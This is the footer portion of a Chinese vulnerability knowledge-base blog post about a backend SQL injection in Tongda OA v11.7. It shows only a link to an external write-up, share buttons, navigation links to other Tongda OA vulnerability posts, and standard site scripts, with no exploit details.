+<p>[通达OA v11.7后台SQL注入到RCE<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw" target="_blank" rel="noopener noreffer">0day]</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-title="通达OA v11.7 delete_cascade.php 后台SQL注入" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-title="通达OA v11.7 delete_cascade.php 后台SQL注入"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-title="通达OA v11.7 delete_cascade.php 后台SQL注入"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-title="通达OA v11.7 delete_cascade.php 后台SQL注入"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="通达OA v11.8 api.ali.php 任意文件上传漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>通达OA v11.8 api.ali.php 任意文件上传漏洞</a>
+            <a href="/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="通达OA v11.7 auth_mobi.php 在线用户登录漏洞">通达OA v11.7 auth_mobi.php 在线用户登录漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
